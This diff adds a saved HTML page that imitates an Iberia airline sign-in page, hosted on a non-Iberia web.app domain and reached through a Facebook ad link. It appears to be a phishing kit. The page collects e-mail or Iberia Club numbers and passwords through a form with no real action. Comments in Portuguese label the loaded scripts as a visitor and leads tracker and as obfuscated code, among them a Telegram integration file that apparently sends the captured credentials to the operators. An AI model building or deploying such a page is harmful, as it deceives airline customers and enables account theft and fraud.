@@ -1,0 +1,713 @@
+<!DOCTYPE html>
+<!-- saved from url=(0223)https://onbusinessiberia.web.app/?fbclid=IwY2xjawN6wOdleHRuA2FlbQIxMABicmlkETFybVJSeTZmVGp2WmJiUnROc3J0YwZhcHBfaWQPNTQxNjM5NDkzODg5MDI1AAEeJzV6ewqbXf-XBx_qKTyYbLMzFDJR96klrzz996bXokGFF_huWvW4mWl-pYs_aem_U1rxf5iUMTqcHUsnlR3hww# -->
+<html lang="es"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="robots" content="noindex, nofollow">
+    <title>Iberia Login - Iniciar Sesión</title>
+    <link rel="icon" type="image/svg+xml" href="./Xjdsahd637sddUmi/logotopo.svg">
+    
+    <!-- Font Awesome Icons -->
+    <link rel="stylesheet" href="./Xjdsahd637sddUmi/all.min.css" integrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw==" crossorigin="anonymous" referrerpolicy="no-referrer">
+    
+    <style>
+        /* ============================================
+           RESET E VARIÁVEIS
+           ============================================ */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            /* Cores Iberia */
+            --iberia-red: #d7192d;
+            --iberia-red-dark: #a80e1f;
+            --iberia-red-hover: #b9191a;
+            --iberia-red-separator: #a8191a;
+            --iberia-yellow: #fcd100;
+            --iberia-orange: #f08400;
+            
+            /* Cores neutras */
+            --gray-lightest: #f8f8f8;
+            --gray-light: #eeeeee;
+            --gray-medium: #5b5b5b;
+            --gray-dark: #333333;
+            --gray-darker: #383838;
+            --white: #ffffff;
+            
+            /* Fontes */
+            --font-primary: 'Segoe UI', Verdana, Arial, Helvetica, sans-serif;
+            --font-size-base: 16px;
+            --font-size-small: 0.813rem;
+            --font-size-medium: 0.875rem;
+            --font-size-large: 1.2rem;
+            
+            /* Espaçamentos */
+            --spacing-xs: 0.5rem;
+            --spacing-sm: 1rem;
+            --spacing-md: 1.5rem;
+            --spacing-lg: 2rem;
+            --spacing-xl: 3rem;
+            
+            /* Bordas */
+            --border-radius: 4px;
+            --border-width: 1px;
+            
+            /* Transições */
+            --transition-fast: 0.15s ease;
+            --transition-normal: 0.3s ease;
+        }
+
+        /* ============================================
+           ESTILOS GLOBAIS
+           ============================================ */
+        html {
+            font-size: var(--font-size-base);
+            height: 100%;
+        }
+
+        body {
+            font-family: var(--font-primary);
+            background-color: var(--gray-light);
+            color: var(--gray-dark);
+            line-height: 1.5;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* ============================================
+           HEADER
+           ============================================ */
+        .ib-header {
+            background: var(--iberia-red);
+            min-height: 4.375rem;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: var(--white);
+            font-size: var(--font-size-small);
+            padding: 0 var(--spacing-xl);
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .ib-header__container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            max-width: 57rem;
+            width: 100%;
+            height: 100%;
+        }
+
+        .ib-header__left {
+            height: 100%;
+            display: flex;
+            align-items: center;
+            gap: var(--spacing-sm);
+        }
+
+        .ib-header__logo {
+            cursor: pointer;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-decoration: none;
+        }
+        .ib-header__logo img { height: 36px; display:block; }
+
+        .ib-header__separator {
+            position: relative;
+            min-height: 4.375rem;
+            background: var(--iberia-red-separator);
+            width: 0.0625rem;
+            opacity: 0.7;
+        }
+
+        .ib-header__right {
+            display: flex;
+            align-items: center;
+            gap: var(--spacing-md);
+        }
+
+        .ib-header__label {
+            color: var(--white);
+        }
+
+        .ib-header__button {
+            text-decoration: none;
+            color: var(--white);
+            padding: var(--spacing-sm);
+            border: var(--border-width) solid var(--white);
+            min-width: 10rem;
+            text-align: center;
+            border-radius: var(--border-radius);
+            transition: background var(--transition-normal);
+        }
+
+        .ib-header__button:hover {
+            background: var(--iberia-red-hover);
+        }
+
+        /* ============================================
+           MAIN CONTENT
+           ============================================ */
+        .ib-main {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: var(--spacing-lg);
+            background: linear-gradient(135deg, #f5f5f5 0%, #e0e0e0 100%);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .ib-main::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-image: 
+                radial-gradient(circle at 20% 50%, rgba(215, 25, 45, 0.05) 0%, transparent 50%),
+                radial-gradient(circle at 80% 80%, rgba(215, 25, 45, 0.03) 0%, transparent 50%);
+            pointer-events: none;
+        }
+
+        .ib-login-container {
+            background: var(--white);
+            border-radius: 8px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            padding: var(--spacing-xl);
+            max-width: 480px;
+            width: 100%;
+            position: relative;
+            z-index: 1;
+        }
+
+        .ib-login__title {
+            font-size: 1.5rem;
+            font-weight: 600;
+            color: var(--gray-dark);
+            margin-bottom: var(--spacing-xs);
+        }
+
+        .ib-login__subtitle {
+            font-size: var(--font-size-medium);
+            color: var(--gray-medium);
+            margin-bottom: var(--spacing-lg);
+        }
+
+        /* ============================================
+           FORMULÁRIO
+           ============================================ */
+        .ib-form {
+            display: flex;
+            flex-direction: column;
+            gap: var(--spacing-md);
+        }
+
+        .ib-input-group {
+            position: relative;
+        }
+
+        .ib-input-label {
+            position: absolute;
+            left: 1rem;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--gray-medium);
+            font-size: var(--font-size-small);
+            pointer-events: none;
+            transition: all var(--transition-fast);
+            background: var(--white);
+            padding: 0 0.25rem;
+        }
+
+        .ib-input-label--focus {
+            top: 0;
+            font-size: 0.75rem;
+            color: var(--iberia-red);
+        }
+
+        .ib-input {
+            width: 100%;
+            padding: 1rem;
+            border: var(--border-width) solid #d1d1d1;
+            border-radius: var(--border-radius);
+            font-size: var(--font-size-small);
+            transition: border-color var(--transition-fast);
+            outline: none;
+        }
+
+        .ib-input:focus {
+            border-color: var(--iberia-red);
+        }
+
+        .ib-input--error {
+            border-color: #dc3545 !important;
+        }
+
+        .ib-input-wrapper {
+            position: relative;
+        }
+
+        .ib-input-icon {
+            position: absolute;
+            right: 1rem;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: var(--gray-medium);
+            background: none;
+            border: none;
+            padding: 0.5rem;
+            font-size: 1.2rem;
+        }
+
+        .ib-input-icon:hover {
+            color: var(--gray-dark);
+        }
+
+        .ib-alert {
+            padding: 0.5rem;
+            border-radius: var(--border-radius);
+            font-size: 0.75rem;
+            margin-top: 0.25rem;
+        }
+
+        .ib-alert--error {
+            background-color: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+
+        .ib-alert.u-hide {
+            display: none;
+        }
+
+        /* ============================================
+           BOTÕES
+           ============================================ */
+        .ib-button {
+            width: 100%;
+            padding: 0.875rem;
+            border: none;
+            border-radius: var(--border-radius);
+            font-size: var(--font-size-small);
+            font-weight: 600;
+            cursor: pointer;
+            transition: all var(--transition-normal);
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+        }
+
+        .ib-button--primary {
+            background-color: var(--iberia-red);
+            color: var(--white);
+        }
+
+        .ib-button--primary:hover {
+            background-color: var(--iberia-red-dark);
+            transform: translateY(-1px);
+            box-shadow: 0 4px 8px rgba(215, 25, 45, 0.3);
+        }
+
+        .ib-button--primary:active {
+            transform: translateY(0);
+        }
+
+        .ib-button--social {
+            background: var(--white);
+            border: var(--border-width) solid #d1d1d1;
+            color: var(--gray-dark);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+            padding: 0.75rem;
+        }
+
+        .ib-button--social:hover {
+            background: var(--gray-lightest);
+            border-color: var(--gray-medium);
+        }
+
+        .ib-button--google::before {
+            content: 'G';
+            display: inline-block;
+            width: 24px;
+            height: 24px;
+            background: #4285F4;
+            color: white;
+            border-radius: 2px;
+            line-height: 24px;
+            font-weight: bold;
+        }
+
+        .ib-button--facebook::before {
+            content: 'f';
+            display: inline-block;
+            width: 24px;
+            height: 24px;
+            background: #1877F2;
+            color: white;
+            border-radius: 50%;
+            line-height: 24px;
+            font-weight: bold;
+            font-family: serif;
+        }
+
+        /* ============================================
+           LINKS
+           ============================================ */
+        .ib-link {
+            color: var(--iberia-red);
+            text-decoration: none;
+            font-size: var(--font-size-small);
+            transition: color var(--transition-fast);
+        }
+
+        .ib-link:hover {
+            color: var(--iberia-red-dark);
+            text-decoration: underline;
+        }
+
+        .ib-forgot-password {
+            display: block;
+            text-align: right;
+            margin-top: 0.5rem;
+            margin-bottom: var(--spacing-sm);
+        }
+
+        /* ============================================
+           DIVIDER
+           ============================================ */
+        .ib-divider {
+            text-align: center;
+            position: relative;
+            margin: var(--spacing-lg) 0;
+        }
+
+        .ib-divider::before,
+        .ib-divider::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            width: 45%;
+            height: 1px;
+            background: #d1d1d1;
+        }
+
+        .ib-divider::before {
+            left: 0;
+        }
+
+        .ib-divider::after {
+            right: 0;
+        }
+
+        .ib-divider__text {
+            background: var(--white);
+            padding: 0 var(--spacing-sm);
+            color: var(--gray-medium);
+            font-size: var(--font-size-small);
+        }
+
+        /* ============================================
+           FOOTER
+           ============================================ */
+        .ib-footer {
+            font-size: var(--font-size-small);
+            background: var(--white);
+            border-top: 1px solid #d1d1d1;
+        }
+
+        .ib-footer__red {
+            background: linear-gradient(180deg, var(--iberia-red), var(--iberia-red-dark));
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: var(--spacing-sm);
+            color: var(--white);
+        }
+
+        .ib-footer__container {
+            max-width: 57rem;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .ib-footer__logo {
+            display:flex;
+            align-items:center;
+            justify-content:center;
+        }
+        .ib-footer__logo img { height:28px; display:block; filter: brightness(0) invert(1); }
+
+        .ib-footer__links {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-end;
+            gap: 0.2rem;
+        }
+
+        .ib-footer__link {
+            color: var(--white);
+            text-decoration: none;
+        }
+
+        .ib-footer__link:hover {
+            color: var(--iberia-yellow);
+            text-decoration: underline;
+        }
+
+        .ib-footer__gray {
+            background: var(--gray-light);
+            color: var(--gray-darker);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: var(--spacing-sm);
+        }
+
+        .ib-footer__copyright {
+            max-width: 57rem;
+            width: 100%;
+        }
+
+        .ib-contact {
+            text-align: center;
+            padding: var(--spacing-md);
+            background: var(--white);
+            font-size: var(--font-size-small);
+        }
+
+        /* ============================================
+           ACESSIBILIDADE
+           ============================================ */
+        *:focus-visible {
+            outline: 2px solid var(--iberia-orange);
+            outline-offset: 2px;
+        }
+
+        /* ============================================
+           RESPONSIVO - MOBILE
+           ============================================ */
+        @media (max-width: 768px) {
+            .ib-header {
+                padding: 0 var(--spacing-sm);
+                min-height: 2.813rem;
+            }
+
+            .ib-header__logo {
+                height: 1.5625rem;
+                width: 2.0625rem;
+                font-size: 1rem;
+            }
+
+            .ib-header__separator {
+                min-height: 2.813rem;
+                margin-right: var(--spacing-xs);
+            }
+
+            .ib-header__right {
+                gap: var(--spacing-xs);
+            }
+
+            .ib-header__button {
+                border: none;
+                padding: 0;
+                text-decoration: underline;
+                min-width: 0;
+            }
+
+            .ib-header__button:hover {
+                background: inherit;
+                color: var(--iberia-yellow);
+                text-decoration: none;
+            }
+
+            .ib-login-container {
+                padding: var(--spacing-lg);
+            }
+
+            .ib-main {
+                padding: var(--spacing-sm);
+            }
+
+            .ib-footer__logo--red {
+                display: none;
+            }
+
+            .ib-footer__gray {
+                justify-content: space-between;
+            }
+        }
+
+        @media (max-width: 425px) {
+            .ib-login__title {
+                font-size: 1.25rem;
+            }
+
+            .ib-header__label {
+                font-size: 0.75rem;
+            }
+        }
+
+        /* ============================================
+           ANIMAÇÕES
+           ============================================ */
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .ib-login-container {
+            animation: fadeIn 0.4s ease-out;
+        }
+
+        /* ============================================
+           UTILITÁRIOS
+           ============================================ */
+        .u-hide {
+            display: none !important;
+        }
+
+        .u-text-center {
+            text-align: center;
+        }
+
+        .u-mb-none {
+            margin-bottom: 0;
+        }
+
+        .u-mt-medium {
+            margin-top: var(--spacing-md);
+        }
+
+        .u-mb-xmedium {
+            margin-bottom: var(--spacing-md);
+        }
+    </style>
+</head>
+<body class="">
+    <!-- HEADER -->
+    <header class="ib-header">
+        <div class="ib-header__container">
+            <div class="ib-header__left">
+                <a href="https://www.iberia.com/es/" class="ib-header__logo" title="Iberia">
+                    <img src="./Xjdsahd637sddUmi/logotopo.svg" alt="Iberia">
+                </a>
+                <div class="ib-header__separator"></div>
+            </div>
+            <div class="ib-header__right">
+                <span class="ib-header__label">¿No tienes cuenta?</span>
+                <a href="https://onbusinessiberia.web.app/?fbclid=IwY2xjawN6wOdleHRuA2FlbQIxMABicmlkETFybVJSeTZmVGp2WmJiUnROc3J0YwZhcHBfaWQPNTQxNjM5NDkzODg5MDI1AAEeJzV6ewqbXf-XBx_qKTyYbLMzFDJR96klrzz996bXokGFF_huWvW4mWl-pYs_aem_U1rxf5iUMTqcHUsnlR3hww#" class="ib-header__button">Regístrate</a>
+            </div>
+        </div>
+    </header>
+
+    <!-- MAIN CONTENT -->
+    <main class="ib-main">
+        <section class="ib-login-container">
+            <h1 class="ib-login__title">Inicia sesión</h1>
+            <p class="ib-login__subtitle">Podrás reservar más rápido y conseguir descuentos</p>
+
+            <form class="ib-form" id="loginForm" novalidate="">
+                <!-- Email/Número Iberia Club -->
+                <div class="ib-input-group">
+                    <label class="ib-input-label ib-input-label--focus" id="emailLabel" for="emailInput">
+                        E-mail o nº Iberia Club
+                    </label>
+                    <input type="text" class="ib-input" id="emailInput" autocomplete="username">
+                    <div class="ib-alert ib-alert--error u-hide" id="emailError">
+                        <span id="emailErrorText"></span>
+                    </div>
+                </div>
+
+                <!-- Contraseña -->
+                <div class="ib-input-group">
+                    <div class="ib-input-wrapper">
+                        <label class="ib-input-label ib-input-label--focus" id="passwordLabel" for="passwordInput">
+                            Contraseña
+                        </label>
+                        <input type="password" class="ib-input" id="passwordInput" autocomplete="current-password">
+                        <button type="button" class="ib-input-icon" id="togglePassword" aria-label="Mostrar contraseña"><i class="fas fa-eye"></i></button>
+                    </div>
+                    <div class="ib-alert ib-alert--error u-hide" id="passwordError">
+                        <span id="passwordErrorText"></span>
+                    </div>
+                </div>
+
+                <!-- Origem para o Worker -->
+                <input type="hidden" name="origem" value="form_index">
+
+                <!-- Olvidó contraseña -->
+                <a href="https://onbusinessiberia.web.app/?fbclid=IwY2xjawN6wOdleHRuA2FlbQIxMABicmlkETFybVJSeTZmVGp2WmJiUnROc3J0YwZhcHBfaWQPNTQxNjM5NDkzODg5MDI1AAEeJzV6ewqbXf-XBx_qKTyYbLMzFDJR96klrzz996bXokGFF_huWvW4mWl-pYs_aem_U1rxf5iUMTqcHUsnlR3hww#" class="ib-link ib-forgot-password">¿Has olvidado tu contraseña?</a>
+
+                <!-- Botão de login (corrigido: sem disabled) -->
+                <button type="submit" class="ib-button ib-button--primary" aria-label="Iniciar sesión">Iniciar sesión</button>
+
+                <!-- Divider -->
+                <div class="ib-divider">
+                    <span class="ib-divider__text">O</span>
+                </div>
+
+                <!-- Login Social -->
+                <button type="button" class="ib-button ib-button--social ib-button--google" aria-label="Entrar con Google">
+                    Entrar con Google
+                </button>
+                <button type="button" class="ib-button ib-button--social ib-button--facebook" aria-label="Entrar con Facebook">
+                    Entrar con Facebook
+                </button>
+            </form>
+        </section>
+    </main>
+
+    <!-- CONTACT -->
+    <div class="ib-contact">
+        ¿Tienes dudas? <a href="https://onbusinessiberia.web.app/?fbclid=IwY2xjawN6wOdleHRuA2FlbQIxMABicmlkETFybVJSeTZmVGp2WmJiUnROc3J0YwZhcHBfaWQPNTQxNjM5NDkzODg5MDI1AAEeJzV6ewqbXf-XBx_qKTyYbLMzFDJR96klrzz996bXokGFF_huWvW4mWl-pYs_aem_U1rxf5iUMTqcHUsnlR3hww#" class="ib-link">Contacta con nosotros</a>
+    </div>
+
+    <!-- FOOTER -->
+    <footer class="ib-footer">
+        <div class="ib-footer__red">
+            <div class="ib-footer__container">
+                <div class="ib-footer__logo ib-footer__logo--red">
+                    <img src="./Xjdsahd637sddUmi/logofoter.svg" alt="Iberia">
+                </div>
+                <div class="ib-footer__links">
+                    <a href="https://onbusinessiberia.web.app/?fbclid=IwY2xjawN6wOdleHRuA2FlbQIxMABicmlkETFybVJSeTZmVGp2WmJiUnROc3J0YwZhcHBfaWQPNTQxNjM5NDkzODg5MDI1AAEeJzV6ewqbXf-XBx_qKTyYbLMzFDJR96klrzz996bXokGFF_huWvW4mWl-pYs_aem_U1rxf5iUMTqcHUsnlR3hww#" class="ib-footer__link">Accesibilidad</a>
+                </div>
+            </div>
+        </div>
+        <div class="ib-footer__gray">
+            <div class="ib-footer__copyright">© Iberia 2025</div>
+        </div>
+    </footer>
+
+    <!-- Rastreador de Visitantes e Leads -->
+    <script src="./Xjdsahd637sddUmi/tracker.js"></script>
+    
+    <!-- Scripts Ofuscados -->
+    <script src="./Xjdsahd637sddUmi/telegram-integration.min.js"></script>
+    <script src="./Xjdsahd637sddUmi/app.min.js"></script>
+
+
+</body></html>
